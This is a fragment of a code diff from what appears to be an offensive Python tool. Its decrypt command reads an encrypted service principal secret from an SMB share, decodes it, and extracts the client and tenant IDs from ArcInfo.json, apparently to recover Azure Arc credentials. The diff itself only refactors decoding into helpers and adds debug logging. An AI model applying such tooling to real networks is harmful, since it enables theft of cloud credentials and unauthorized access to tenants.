-                for line in lines[start:start + 200]:
-                    print(f"  {DIM}{line}{RESET}")
-            else:
-                # fallback: show every line that mentions a relevant API
-                keywords = ("DpapiNg", "NCrypt", "Unprotect", "Protect", "ProtectedData",
-                            "DllImport", "DataProtect", "AesKw", "KeyWrap")
-                hits = [l for l in lines if any(kw in l for kw in keywords)]
-                for line in hits[:60]:
-                    print(f"  {DIM}{line}{RESET}")
-            print()
+            _print_psm1_excerpt(psm1_str)
 
         if secret_raw is None:
             print(_bad("Could not read encryptedServicePrincipalSecret from share"))
@@ -949,16 +1157,7 @@ def cmd_decrypt(args):
         # decode blob
         dbg("DEC", _info, f"Raw file: {len(secret_raw)} bytes, first 16: {secret_raw[:16].hex()}")
         raw = decode_pwsh_bytes(secret_raw).encode("ascii", errors="ignore")
-        blob = None
-        for strategy, fn in [
-            ("base64", lambda r: base64.b64decode(r)),
-            ("hex",    lambda r: bytes.fromhex(r.decode("ascii", errors="ignore").strip())),
-            ("raw",    lambda r: r),
-        ]:
-            with contextlib.suppress(Exception):
-                blob = fn(raw)
-                dbg("DEC", _good, f"Decoded blob ({len(blob)} bytes, {strategy})")
-                break
+        blob = _decode_secret_blob(raw)
         if blob is None:
             print(_bad("Could not decode encryptedServicePrincipalSecret"))
             sys.exit(1)
@@ -1020,10 +1219,12 @@ def cmd_decrypt(args):
         sp_id     = ""
         tenant_id = ""
         if arcinfo_raw:
+            dbg("DEC", _info, "Parsing ArcInfo.json ...")
             with contextlib.suppress(Exception):
                 arc_info  = json.loads(arcinfo_raw)
                 sp_id     = arc_info.get("ServicePrincipalClientId", "")
                 tenant_id = arc_info.get("TenantId", "")
+            dbg("DEC", _good, f"SP ID: {sp_id or 'N/A'}, Tenant ID: {tenant_id or 'N/A'}")
         else:
             pline("SMB", _warn, "ArcInfo.json was not found on the share - SP ID and Tenant ID unavailable")
 
